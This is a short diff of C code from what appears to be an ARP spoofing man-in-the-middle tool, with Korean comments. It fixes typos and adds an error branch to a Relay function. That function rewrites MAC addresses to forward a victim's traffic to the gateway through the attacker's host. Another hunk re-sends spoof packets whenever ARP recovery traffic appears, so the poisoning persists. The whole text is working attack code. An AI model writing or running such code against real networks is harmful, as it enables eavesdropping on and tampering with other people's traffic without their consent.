@@ -163,16 +163,21 @@ void Relay(pcap_t *adhandle,const u_char * rsv_packet,addressList list, int len,
     packetMake(packet,rsv_packet,len); // 패킷 그대로 복사
     if(from ==1) //victim -> gateway relay
     {
-        packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
+        packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAC 주소 Gateway로
         packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
     }
     else if(from==2) // gateway -> victim relay
     {
-        packetMake(packet,list.VictimMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
+        packetMake(packet,list.VictimMAC,ETHER_ADDR_LEN); //destination MAC 주소 Gateway로
         packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
     }
-    packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
-    packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
+    else
+    {
+        fprintf(stderr,"\nError sending the packet: %s   (Relay)\n", pcap_geterr(adhandle));
+        free(packet);
+        return ;
+    }
+
     if(pcap_sendpacket(adhandle, packet,len)!=0)
     {
         fprintf(stderr,"\nError sending the packet: %s   (Relay)\n", pcap_geterr(adhandle));
@@ -337,7 +342,7 @@ void spoofing_relay(pcap_t *adhandle, struct pcap_pkthdr *header, struct address
         }
 
         EtherHeader=(libnet_ethernet_hdr*)rcv_pkt;
-        if((htons(EtherHeader->ether_type)==0x0806)&&isARPPacket(rcv_pkt,list)==1) // arp 패
+        if((htons(EtherHeader->ether_type)==0x0806)&&isARPPacket(rcv_pkt,list)==1) // arp 패킷
         {
             spoofPacketSend(adhandle,list);
             printf("Recovery preventing spoofing packet sended!\n");
